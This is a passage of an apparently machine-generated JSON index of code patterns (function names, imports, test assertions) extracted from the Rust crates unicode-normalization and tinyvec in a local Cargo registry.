          "# a few things that could be done. First, the hash function could be",
          "# tweaked. Second, the bucket order could be scrambled (especially the",
          "# singletons). Right now, the buckets are sorted, which has the advantage",
          "# of being deterministic.",
          "#",
          "# As a more extreme approach, the singleton bucket optimization could be",
          "# applied (give the direct address for singleton buckets, rather than",
          "# relying on a rehash). That is definitely the more standard approach in",
          "# the minimal perfect hashing literature, but in testing the branch was a",
          "# significant slowdown."
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 6,
        "error_handling": 0,
        "decorators": []
      }
    ],
    "rust_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/unicode-normalization-0.1.25/benches/bench.rs",
        "function_defs": [
          "fn bench_is_nfc_ascii(b: &mut Bencher) {",
          "fn bench_is_nfc_normalized(b: &mut Bencher) {",
          "fn bench_is_nfc_not_normalized(b: &mut Bencher) {",
          "fn bench_is_nfd_ascii(b: &mut Bencher) {",
          "fn bench_is_nfd_normalized(b: &mut Bencher) {",
          "fn bench_is_nfd_not_normalized(b: &mut Bencher) {",
          "fn bench_is_nfc_stream_safe_ascii(b: &mut Bencher) {",
          "fn bench_is_nfc_stream_safe_normalized(b: &mut Bencher) {",
          "fn bench_is_nfc_stream_safe_not_normalized(b: &mut Bencher) {",
          "fn bench_is_nfd_stream_safe_ascii(b: &mut Bencher) {",
          "fn bench_is_nfd_stream_safe_normalized(b: &mut Bencher) {",
          "fn bench_is_nfd_stream_safe_not_normalized(b: &mut Bencher) {",
          "fn bench_nfc_ascii(b: &mut Bencher) {",
          "fn bench_nfd_ascii(b: &mut Bencher) {",
          "fn bench_nfc_long(b: &mut Bencher) {",
          "fn bench_nfd_long(b: &mut Bencher) {",
          "fn bench_nfkc_ascii(b: &mut Bencher) {",
          "fn bench_nfkd_ascii(b: &mut Bencher) {",
          "fn bench_nfkc_long(b: &mut Bencher) {",
          "fn bench_nfkd_long(b: &mut Bencher) {",
          "fn bench_streamsafe_ascii(b: &mut Bencher) {",
          "fn bench_streamsafe_adversarial(b: &mut Bencher) {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::fs;",
          "use test::Bencher;",
          "use unicode_normalization::UnicodeNormalization;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 4
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/unicode-normalization-0.1.25/src/lookups.rs",
        "function_defs": [
          "fn u8_lookup_fk(kv: u32) -> u32 {",
          "fn u8_lookup_fv(kv: u32) -> u8 {",
          "fn bool_lookup_fk(kv: u32) -> u32 {",
          "fn bool_lookup_fv(_kv: u32) -> bool {",
          "fn pair_lookup_fk<T>(kv: (u32, T)) -> u32 {",
          "fn pair_lookup_fv_opt<T>(kv: (u32, T)) -> Option<T> {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::perfect_hash::mph_lookup;",
          "use crate::tables::*;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/unicode-normalization-0.1.25/src/test.rs",
        "function_defs": [
          "fn test_nfd() {",
          "fn test_nfkd() {",
          "fn test_nfc() {",
          "fn test_nfkc() {",
          "fn test_normalize_char() {",
          "fn test_is_combining_mark_ascii() {",
          "fn test_is_combining_mark_misc() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use super::char::is_combining_mark;",
          "use super::UnicodeNormalization;",
          "use core::char;",
          "use alloc::string::{String, ToString};"
        ],
        "macros": [
          "assert_eq!($input.nfd().to_string(), $expected);",
          "assert_eq!(",
          "t!(\"abc\", \"abc\");",
          "t!(\"\\u{1e0b}\\u{1c4}\", \"d\\u{307}\\u{1c4}\");",
          "t!(\"\\u{2026}\", \"\\u{2026}\");",
          "t!(\"\\u{2126}\", \"\\u{3a9}\");",
          "t!(\"\\u{1e0b}\\u{323}\", \"d\\u{323}\\u{307}\");",
          "t!(\"\\u{1e0d}\\u{307}\", \"d\\u{323}\\u{307}\");",
          "t!(\"a\\u{301}\", \"a\\u{301}\");",
          "t!(\"\\u{301}a\", \"\\u{301}a\");",
          "t!(\"\\u{d4db}\", \"\\u{1111}\\u{1171}\\u{11b6}\");",
          "t!(\"\\u{ac1c}\", \"\\u{1100}\\u{1162}\");",
          "assert_eq!($input.nfkd().to_string(), $expected);",
          "t!(\"abc\", \"abc\");",
          "t!(\"\\u{1e0b}\\u{1c4}\", \"d\\u{307}DZ\\u{30c}\");",
          "t!(\"\\u{2026}\", \"...\");",
          "t!(\"\\u{2126}\", \"\\u{3a9}\");",
          "t!(\"\\u{1e0b}\\u{323}\", \"d\\u{323}\\u{307}\");",
          "t!(\"\\u{1e0d}\\u{307}\", \"d\\u{323}\\u{307}\");",
          "t!(\"a\\u{301}\", \"a\\u{301}\");",
          "t!(\"\\u{301}a\", \"\\u{301}a\");",
          "t!(\"\\u{d4db}\", \"\\u{1111}\\u{1171}\\u{11b6}\");",
          "t!(\"\\u{ac1c}\", \"\\u{1100}\\u{1162}\");",
          "assert_eq!($input.nfc().to_string(), $expected);",
          "t!(\"abc\", \"abc\");",
          "t!(\"\\u{1e0b}\\u{1c4}\", \"\\u{1e0b}\\u{1c4}\");",
          "t!(\"\\u{2026}\", \"\\u{2026}\");",
          "t!(\"\\u{2126}\", \"\\u{3a9}\");",
          "t!(\"\\u{1e0b}\\u{323}\", \"\\u{1e0d}\\u{307}\");",
          "t!(\"\\u{1e0d}\\u{307}\", \"\\u{1e0d}\\u{307}\");",
          "t!(\"a\\u{301}\", \"\\u{e1}\");",
          "t!(\"\\u{301}a\", \"\\u{301}a\");",
          "t!(\"\\u{d4db}\", \"\\u{d4db}\");",
          "t!(\"\\u{ac1c}\", \"\\u{ac1c}\");",
          "t!(",
          "assert_eq!($input.nfkc().to_string(), $expected);",
          "t!(\"abc\", \"abc\");",
          "t!(\"\\u{1e0b}\\u{1c4}\", \"\\u{1e0b}D\\u{17d}\");",
          "t!(\"\\u{2026}\", \"...\");",
          "t!(\"\\u{2126}\", \"\\u{3a9}\");",
          "t!(\"\\u{1e0b}\\u{323}\", \"\\u{1e0d}\\u{307}\");",
          "t!(\"\\u{1e0d}\\u{307}\", \"\\u{1e0d}\\u{307}\");",
          "t!(\"a\\u{301}\", \"\\u{e1}\");",
          "t!(\"\\u{301}a\", \"\\u{301}a\");",
          "t!(\"\\u{d4db}\", \"\\u{d4db}\");",
          "t!(\"\\u{ac1c}\", \"\\u{ac1c}\");",
          "t!(",
          "assert_eq!('\\u{2126}'.nfd().to_string(), \"\\u{3a9}\")",
          "assert!(!is_combining_mark(char::from_u32(cp).unwrap()));",
          "assert!(is_combining_mark('\\u{11C3A}'));",
          "assert!(is_combining_mark('\\u{11C3F}'));"
        ],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/unicode-normalization-0.1.25/src/normalize.rs",
        "function_defs": [
          "fn decompose<D, F>(c: char, decompose_char: D, mut emit_char: F)",
          "fn compose_hangul(a: char, b: char) -> Option<char> {",
          "fn test_hangul_composition() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::lookups::{",
          "use core::char;",
          "use super::compose_hangul;"
        ],
        "macros": [
          "assert_eq!(compose_hangul('\\u{c8e0}', '\\u{11a7}'), None);"
        ],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/unicode-normalization-0.1.25/src/lib.rs",
        "function_defs": [
          "fn nfd(self) -> Decompositions<I>;",
          "fn nfkd(self) -> Decompositions<I>;",
          "fn nfc(self) -> Recompositions<I>;",
          "fn nfkc(self) -> Recompositions<I>;",
          "fn cjk_compat_variants(self) -> Replacements<I>;",
          "fn stream_safe(self) -> StreamSafe<I>;",
          "fn nfd(self) -> Decompositions<Chars<'a>> {",
          "fn nfkd(self) -> Decompositions<Chars<'a>> {",
          "fn nfc(self) -> Recompositions<Chars<'a>> {",
          "fn nfkc(self) -> Recompositions<Chars<'a>> {",
          "fn cjk_compat_variants(self) -> Replacements<Chars<'a>> {",
          "fn stream_safe(self) -> StreamSafe<Chars<'a>> {",
          "fn nfd(self) -> Decompositions<option::IntoIter<char>> {",
          "fn nfkd(self) -> Decompositions<option::IntoIter<char>> {",
          "fn nfc(self) -> Recompositions<option::IntoIter<char>> {",
          "fn nfkc(self) -> Recompositions<option::IntoIter<char>> {",
          "fn cjk_compat_variants(self) -> Replacements<option::IntoIter<char>> {",
          "fn stream_safe(self) -> StreamSafe<option::IntoIter<char>> {",
          "fn nfd(self) -> Decompositions<I> {",
          "fn nfkd(self) -> Decompositions<I> {",
          "fn nfc(self) -> Recompositions<I> {",
          "fn nfkc(self) -> Recompositions<I> {",
          "fn cjk_compat_variants(self) -> Replacements<I> {",
          "fn stream_safe(self) -> StreamSafe<I> {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl UnicodeNormalization<option::IntoIter<char>> for char {"
        ],
        "uses": [
          "use core::{option, str::Chars};"
        ],
        "macros": [
          "//!     assert_eq!(compose('A','\\u{30a}'), Some('\u00c5'));",
          "//!     assert_eq!(c, \"\u00c5\u03a9\");"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/unicode-normalization-0.1.25/src/decompose.rs",
        "function_defs": [
          "fn push_back(&mut self, ch: char) {",
          "fn sort_pending(&mut self) {",
          "fn reset_buffer(&mut self) {",
          "fn increment_next_ready(&mut self) {",
          "fn next(&mut self) -> Option<char> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use core::fmt::{self, Write};",
          "use core::iter::{Fuse, FusedIterator};",
          "use core::ops::Range;",
          "use tinyvec::TinyVec;"
        ],
        "macros": [],
        "derives": [
          "#[derive(Clone)]",
          "#[derive(Clone)]"
        ],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/unicode-normalization-0.1.25/src/quick_check.rs",
        "function_defs": [
          "fn quick_check<F, I>(s: I, is_allowed: F, stream_safe: bool) -> IsNormalized",
          "fn test_stream_safe_nfd() {",
          "fn test_stream_safe_nfc() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::lookups::canonical_combining_class;",
          "use crate::stream_safe;",
          "use crate::tables;",
          "use crate::UnicodeNormalization;",
          "use super::{is_nfc_stream_safe_quick, is_nfd_stream_safe_quick, IsNormalized};"
        ],
        "macros": [
          "assert_eq!(is_nfd_stream_safe_quick(okay.chars()), IsNormalized::Yes);",
          "assert_eq!(is_nfd_stream_safe_quick(too_much.chars()), IsNormalized::No);",
          "assert_eq!(is_nfc_stream_safe_quick(okay.chars()), IsNormalized::Maybe);",
          "assert_eq!(is_nfc_stream_safe_quick(too_much.chars()), IsNormalized::No);"
        ],
        "derives": [
          "#[derive(Debug, Eq, PartialEq)]"
        ],
        "error_handling": 7
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/unicode-normalization-0.1.25/src/recompose.rs",
        "function_defs": [
          "fn next(&mut self) -> Option<char> {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::decompose::Decompositions;",
          "use core::{",
          "use tinyvec::TinyVec;",
          "use self::RecompositionState::*;"
        ],
        "macros": [],
        "derives": [
          "#[derive(Clone)]",
          "#[derive(Clone)]"
        ],
        "error_handling": 8
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/unicode-normalization-0.1.25/src/replace.rs",
        "function_defs": [
          "fn next(&mut self) -> Option<char> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use core::{",
          "use tinyvec::ArrayVec;"
        ],
        "macros": [],
        "derives": [
          "#[derive(Clone)]"
        ],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/unicode-normalization-0.1.25/src/perfect_hash.rs",
        "function_defs": [
          "fn my_hash(key: u32, salt: u32, n: usize) -> usize {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/unicode-normalization-0.1.25/src/stream_safe.rs",
        "function_defs": [
          "fn next(&mut self) -> Option<char> {",
          "fn stream_safe(s: &str) -> String {",
          "fn test_simple() {",
          "fn test_all_nonstarters() {",
          "fn test_classify_nonstarters() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use core::iter::FusedIterator;",
          "use crate::lookups::{",
          "use crate::normalize::{hangul_decomposition_length, is_hangul_syllable};",
          "use crate::tables::stream_safe_leading_nonstarters;",
          "use super::{classify_nonstarters, StreamSafe};",
          "use crate::lookups::canonical_combining_class;",
          "use crate::normalize::decompose_compatible;",
          "use alloc::{string::String, vec::Vec};",
          "use core::char;"
        ],
        "macros": [
          "assert_eq!(stream_safe(technically_okay), technically_okay);",
          "assert_eq!(stream_safe(too_much), fixed_it);",
          "assert_eq!(stream_safe(woah_nelly), its_cool);",
          "assert_eq!(stream_safe(s), expected);",
          "assert_eq!(s.len(), c.decomposition_len);",
          "assert_eq!(num_leading, c.leading_nonstarters);",
          "assert_eq!(num_trailing, c.trailing_nonstarters);"
        ],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 4
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/unicode-normalization-0.1.25/src/__test_api.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use alloc::string::String;",
          "use crate::stream_safe::StreamSafe;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/unicode-normalization-0.1.25/src/tables.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::quick_check::IsNormalized;",
          "use crate::quick_check::IsNormalized::*;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 7
      }
    ],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tinyvec-1.10.0",
    "name": "tinyvec-1.10.0",
    "languages": [
      "Rust"
    ],
    "python_patterns": [],
    "rust_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tinyvec-1.10.0/tests/arrayvec.rs",
        "function_defs": [
          "fn test_a_vec() {",
          "fn ArrayVec_push_pop() {",
          "fn ArrayVec_push_overflow() {",
          "fn ArrayVec_formatting() {",
          "fn ArrayVec_iteration() {",
          "fn ArrayVec_append() {",
          "fn ArrayVec_remove() {",
          "fn ArrayVec_remove_invalid() {",
          "fn ArrayVec_swap_remove() {",
          "fn ArrayVec_drain() {",
          "fn ArrayVec_splice() {",
          "fn iter_last_nth() {",
          "fn reviter() {",
          "fn ArrayVec_ser_de_empty() {",
          "fn ArrayVec_ser_de() {",
          "fn ArrayVec_borsh_de_empty() {",
          "fn ArrayVec_borsh_de() {",
          "fn ArrayVec_try_from_slice() {",
          "fn ArrayVec_pretty_debug() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use serde_test::{assert_tokens, Token};",
          "use std::iter::FromIterator;",
          "use tinyvec::*;",
          "use std::convert::TryFrom;"
        ],
        "macros": [
          "let actual = array_vec!(1, 2, 3);",
          "assert_eq!(expected, actual);",
          "assert_eq!(array_vec![0u8; 4], array_vec!(0u8, 0u8, 0u8, 0u8));",
          "assert_eq!(array_vec![0u8; 4], array_vec!([u8; 4] => 0, 0, 0, 0));",
          "assert_eq!(array_vec![0; 4], array_vec!(0, 0, 0, 0));",
          "assert_eq!(array_vec![0; 4], array_vec!([u8; 4] => 0, 0, 0, 0));",
          "let actual2 = array_vec!([f32; 3] => 1.1, 1.1, 1.1);",
          "assert_eq!(expected2, actual2);",
          "assert_eq!(av.len(), 0);",
          "assert_eq!(av.pop(), None);",
          "assert_eq!(av.len(), 1);",
          "assert_eq!(av[0], 10);",
          "assert_eq!(av.pop(), Some(10));",
          "assert_eq!(av.len(), 0);",
          "assert_eq!(av.pop(), None);",
          "assert_eq!(av[0], 10);",
          "assert_eq!(av[1], 11);",
          "assert_eq!(av[2], 12);",
          "assert_eq!(av[3], 13);",
          "assert_eq!(av.len(), 4);",
          "assert_eq!(av.pop(), Some(13));",
          "assert_eq!(av.len(), 3);",
          "assert_eq!(av.pop(), Some(12));",
          "assert_eq!(av.len(), 2);",
          "assert_eq!(av.pop(), Some(11));",
          "assert_eq!(av.len(), 1);",
          "assert_eq!(av.pop(), Some(10));",
          "assert_eq!(av.len(), 0);",
          "assert_eq!(av.pop(), None);",
          "assert_eq!(format!(\"{:?}\", av), \"[]\");",
          "assert_eq!(format!(\"{:?}\", av), \"[10]\");",
          "assert_eq!(format!(\"{:?}\", av), \"[10, 11]\");",
          "assert_eq!(format!(\"{:?}\", av), \"[10, 11, 12]\");",
          "assert_eq!(format!(\"{:b}\", av), \"[]\");",
          "assert_eq!(format!(\"{:o}\", av), \"[]\");",
          "assert_eq!(format!(\"{:x}\", av), \"[]\");",
          "assert_eq!(format!(\"{:X}\", av), \"[]\");",
          "assert_eq!(format!(\"{}\", av), \"[]\");",
          "assert_eq!(format!(\"{:e}\", av), \"[]\");",
          "assert_eq!(format!(\"{:E}\", av), \"[]\");",
          "assert_eq!(format!(\"{:p}\", av), \"[]\");",
          "let av = array_vec!([i32; 4] => 10, 11, 12, 13);",
          "assert_eq!(i.next(), Some(10));",
          "assert_eq!(i.next(), Some(11));",
          "assert_eq!(i.next(), Some(12));",
          "assert_eq!(i.next(), Some(13));",
          "assert_eq!(i.next(), None);",
          "let av = array_vec!([i32; 4] => 10, 11, 12, 13);",
          "assert_eq!(av, av2);",
          "assert!(av.iter().zip(&av2).all(|(&a, &b)| a == -b));",
          "let mut av = array_vec!([i32; 8] => 1, 2, 3);",
          "let mut av2 = array_vec!([i32; 8] => 4, 5, 6);",
          "assert_eq!(av.as_slice(), &[1_i32, 2, 3, 4, 5, 6]);",
          "assert_eq!(av2.as_slice(), &[]);",
          "assert_eq!(av.remove(1), 2);",
          "assert_eq!(&av[..], &[1, 3][..]);",
          "assert_eq!(av.swap_remove(3), 4);",
          "assert_eq!(&av[..], &[1, 2, 3][..]);",
          "assert_eq!(av.swap_remove(0), 1);",
          "assert_eq!(&av[..], &[3, 2][..]);",
          "assert_eq!(av.swap_remove(0), 3);",
          "assert_eq!(&av[..], &[2][..]);",
          "assert_eq!(av.swap_remove(0), 2);",
          "assert_eq!(&av[..], &[][..]);",
          "assert_eq!(Vec::from_iter(av.clone().drain(..)), vec![1, 2, 3]);",
          "assert_eq!(Vec::from_iter(av.clone().drain(..2)), vec![1, 2]);",
          "assert_eq!(Vec::from_iter(av.clone().drain(..3)), vec![1, 2, 3]);",
          "assert_eq!(Vec::from_iter(av.clone().drain(..=1)), vec![1, 2]);",
          "assert_eq!(Vec::from_iter(av.clone().drain(..=2)), vec![1, 2, 3]);",
          "assert_eq!(Vec::from_iter(av.clone().drain(0..)), vec![1, 2, 3]);",
          "assert_eq!(Vec::from_iter(av.clone().drain(1..)), vec![2, 3]);",
          "assert_eq!(Vec::from_iter(av.clone().drain(0..2)), vec![1, 2]);",
          "assert_eq!(Vec::from_iter(av.clone().drain(0..3)), vec![1, 2, 3]);",
          "assert_eq!(Vec::from_iter(av.clone().drain(1..2)), vec![2]);",
          "assert_eq!(Vec::from_iter(av.clone().drain(1..3)), vec![2, 3]);",
          "assert_eq!(Vec::from_iter(av.clone().drain(0..=1)), vec![1, 2]);",
          "assert_eq!(Vec::from_iter(av.clone().drain(0..=2)), vec![1, 2, 3]);",
          "assert_eq!(Vec::from_iter(av.clone().drain(1..=1)), vec![2]);",
          "assert_eq!(Vec::from_iter(av.clone().drain(1..=2)), vec![2, 3]);",
          "assert_eq!(Vec::from_iter(av.clone().splice(.., None)), vec![1, 2, 3]);",
          "assert_eq!(Vec::from_iter(av.clone().splice(..2, None)), vec![1, 2]);",
          "assert_eq!(Vec::from_iter(av.clone().splice(..3, None)), vec![1, 2, 3]);",
          "assert_eq!(Vec::from_iter(av.clone().splice(..=1, None)), vec![1, 2]);",
          "assert_eq!(Vec::from_iter(av.clone().splice(..=2, None)), vec![1, 2, 3]);",
          "assert_eq!(Vec::from_iter(av.clone().splice(0.., None)), vec![1, 2, 3]);",
          "assert_eq!(Vec::from_iter(av.clone().splice(1.., None)), vec![2, 3]);",
          "assert_eq!(Vec::from_iter(av.clone().splice(0..2, None)), vec![1, 2]);",
          "assert_eq!(Vec::from_iter(av.clone().splice(0..3, None)), vec![1, 2, 3]);",
          "assert_eq!(Vec::from_iter(av.clone().splice(1..2, None)), vec![2]);",
          "assert_eq!(Vec::from_iter(av.clone().splice(1..3, None)), vec![2, 3]);",
          "assert_eq!(Vec::from_iter(av.clone().splice(0..=1, None)), vec![1, 2]);",
          "assert_eq!(Vec::from_iter(av.clone().splice(0..=2, None)), vec![1, 2, 3]);",
          "assert_eq!(Vec::from_iter(av.clone().splice(1..=1, None)), vec![2]);",
          "assert_eq!(Vec::from_iter(av.clone().splice(1..=2, None)), vec![2, 3]);",
          "assert_eq!(av2, array_vec![]);",
          "assert_eq!(av2, array_vec![3]);",
          "assert_eq!(av2, array_vec![]);",
          "assert_eq!(av2, array_vec![3]);",
          "assert_eq!(av2, array_vec![]);",
          "assert_eq!(av2, array_vec![]);",
          "assert_eq!(av2, array_vec![1]);",
          "assert_eq!(av2, array_vec![3]);",
          "assert_eq!(av2, array_vec![]);",
          "assert_eq!(av2, array_vec![1, 3]);",
          "assert_eq!(av2, array_vec![1]);",
          "assert_eq!(av2, array_vec![3]);",
          "assert_eq!(av2, array_vec![]);",
          "assert_eq!(av2, array_vec![1, 3]);",
          "assert_eq!(av2, array_vec![1]);",
          "assert_eq!(av2, array_vec![4, 5, 6]);",
          "assert_eq!(av2, array_vec![4, 5, 6, 3]);",
          "assert_eq!(av2, array_vec![4, 5, 6]);",
          "assert_eq!(av2, array_vec![4, 5, 6, 3]);",
          "assert_eq!(av2, array_vec![4, 5, 6]);",
          "assert_eq!(av2, array_vec![4, 5, 6]);",
          "assert_eq!(av2, array_vec![1, 4, 5, 6]);",
          "assert_eq!(av2, array_vec![4, 5, 6, 3]);",
          "assert_eq!(av2, array_vec![4, 5, 6]);",
          "assert_eq!(av2, array_vec![1, 4, 5, 6, 3]);",
          "assert_eq!(av2, array_vec![1, 4, 5, 6]);",
          "assert_eq!(av2, array_vec![4, 5, 6, 3]);",
          "assert_eq!(av2, array_vec![4, 5, 6]);",
          "assert_eq!(av2, array_vec![1, 4, 5, 6, 3]);",
          "assert_eq!(av2, array_vec![1, 4, 5, 6]);",
          "assert_eq!(av2, array_vec![4]);",
          "assert_eq!(av2, array_vec![4, 3]);",
          "assert_eq!(av2, array_vec![1, 4]);",
          "assert_eq!(av2, array_vec![1, 4, 3]);",
          "assert_eq!(av.len(), 4);",
          "assert_eq!(iter.next(), Some(1));",
          "assert_eq!(iter.next(), Some(2));",
          "assert_eq!(iter.next(), Some(3));",
          "assert_eq!(iter.next(), Some(4));",
          "assert_eq!(iter.next(), None);",
          "assert_eq!(iter.last(), None);",
          "assert_eq!(av.into_iter().next(), Some(1));",
          "assert_eq!(iter.next(), Some(1));",
          "assert_eq!(iter.next_back(), Some(4));",
          "assert_eq!(iter.next(), Some(2));",
          "assert_eq!(iter.next_back(), Some(3));",
          "assert_eq!(iter.next(), None);",
          "assert_eq!(iter.next_back(), None);",
          "assert_eq!(iter.nth_back(0), Some(31));",
          "assert_eq!(iter.nth_back(2), Some(28));",
          "assert_eq!(iter.nth_back(0), Some(27));",
          "assert_eq!(iter.nth_back(99), None);",
          "assert_eq!(iter.nth_back(99), None);",
          "assert_eq!(tv, des);",
          "assert_eq!(tv, des);",
          "assert!(empty.is_ok());",
          "assert_eq!(empty.unwrap().as_slice(), &[]);",
          "assert!(fits.is_ok());",
          "assert_eq!(fits.unwrap().as_slice(), &[1, 2]);",
          "assert!(does_not_fit.is_err());",
          "let expect = format!(\"{:#?}\", arr);",
          "let got = format!(\"{:#?}\", arr);",
          "assert_eq!(got, expect);"
        ],
        "derives": [],
        "error_handling": 12
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tinyvec-1.10.0/tests/tinyvec.rs",
        "function_defs": [
          "fn TinyVec_swap_remove() {",
          "fn TinyVec_capacity() {",
          "fn TinyVec_drain() {",
          "fn TinyVec_splice() {",
          "fn TinyVec_resize() {",
          "fn TinyVec_from_slice_impl() {",
          "fn TinyVec_from_array() {",
          "fn TinyVec_macro() {",
          "fn TinyVec_macro_non_copy() {",
          "fn TinyVec_reserve() {",
          "fn TinyVec_try_reserve() {",
          "fn TinyVec_reserve_exact() {",
          "fn TinyVec_try_reserve_exact() {",
          "fn TinyVec_move_to_heap_and_shrink() {",
          "fn TinyVec_try_move_to_heap_and_shrink() {",
          "fn TinyVec_ser_de_empty() {",
          "fn TinyVec_ser_de() {",
          "fn TinyVec_ser_de_heap() {",
          "fn TinyVec_borsh_de_empty() {",
          "fn TinyVec_borsh_de() {",
          "fn TinyVec_borsh_de_heap() {",
          "fn TinyVec_pretty_debug() {",
          "fn TinyVec_std_io_write() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use serde_test::{assert_tokens, Token};",
          "use std::iter::FromIterator;",
          "use tinyvec::*;",
          "use std::io::Write;"
        ],
        "macros": [
          "assert_eq!(tv.swap_remove(3), 4);",
          "assert_eq!(&tv[..], &[1, 2, 3][..]);",
          "assert_eq!(tv.swap_remove(0), 1);",
          "assert_eq!(&tv[..], &[3, 2][..]);",
          "assert_eq!(tv.swap_remove(0), 3);",
          "assert_eq!(&tv[..], &[2][..]);",
          "assert_eq!(tv.swap_remove(0), 2);",
          "assert_eq!(&tv[..], &[][..]);",
          "assert_eq!(tv.capacity(), 1);",
          "assert_eq!(tv.capacity(), 4);",
          "assert_eq!(Vec::from_iter(tv.clone().drain(..)), vec![1, 2, 3]);",
          "assert_eq!(Vec::from_iter(tv.clone().drain(..2)), vec![1, 2]);",
          "assert_eq!(Vec::from_iter(tv.clone().drain(..3)), vec![1, 2, 3]);",
          "assert_eq!(Vec::from_iter(tv.clone().drain(..=1)), vec![1, 2]);",
          "assert_eq!(Vec::from_iter(tv.clone().drain(..=2)), vec![1, 2, 3]);",
          "assert_eq!(Vec::from_iter(tv.clone().drain(0..)), vec![1, 2, 3]);",
          "assert_eq!(Vec::from_iter(tv.clone().drain(1..)), vec![2, 3]);",
          "assert_eq!(Vec::from_iter(tv.clone().drain(0..2)), vec![1, 2]);",
          "assert_eq!(Vec::from_iter(tv.clone().drain(0..3)), vec![1, 2, 3]);",
          "assert_eq!(Vec::from_iter(tv.clone().drain(1..2)), vec![2]);",
          "assert_eq!(Vec::from_iter(tv.clone().drain(1..3)), vec![2, 3]);",
          "assert_eq!(Vec::from_iter(tv.clone().drain(0..=1)), vec![1, 2]);",
          "assert_eq!(Vec::from_iter(tv.clone().drain(0..=2)), vec![1, 2, 3]);",
          "assert_eq!(Vec::from_iter(tv.clone().drain(1..=1)), vec![2]);",
          "assert_eq!(Vec::from_iter(tv.clone().drain(1..=2)), vec![2, 3]);",
          "assert_eq!(Vec::from_iter(tv.clone().splice(.., None)), vec![1, 2, 3]);",
          "assert_eq!(Vec::from_iter(tv.clone().splice(..2, None)), vec![1, 2]);",
          "assert_eq!(Vec::from_iter(tv.clone().splice(..3, None)), vec![1, 2, 3]);",
          "assert_eq!(Vec::from_iter(tv.clone().splice(..=1, None)), vec![1, 2]);",
          "assert_eq!(Vec::from_iter(tv.clone().splice(..=2, None)), vec![1, 2, 3]);",
          "assert_eq!(Vec::from_iter(tv.clone().splice(0.., None)), vec![1, 2, 3]);",
          "assert_eq!(Vec::from_iter(tv.clone().splice(1.., None)), vec![2, 3]);",
          "assert_eq!(Vec::from_iter(tv.clone().splice(0..2, None)), vec![1, 2]);",
          "assert_eq!(Vec::from_iter(tv.clone().splice(0..3, None)), vec![1, 2, 3]);",
          "assert_eq!(Vec::from_iter(tv.clone().splice(1..2, None)), vec![2]);",
          "assert_eq!(Vec::from_iter(tv.clone().splice(1..3, None)), vec![2, 3]);",
          "assert_eq!(Vec::from_iter(tv.clone().splice(0..=1, None)), vec![1, 2]);",
          "assert_eq!(Vec::from_iter(tv.clone().splice(0..=2, None)), vec![1, 2, 3]);",
          "assert_eq!(Vec::from_iter(tv.clone().splice(1..=1, None)), vec![2]);",
          "assert_eq!(Vec::from_iter(tv.clone().splice(1..=2, None)), vec![2, 3]);",
          "assert_eq!(tv2, tiny_vec![]);",
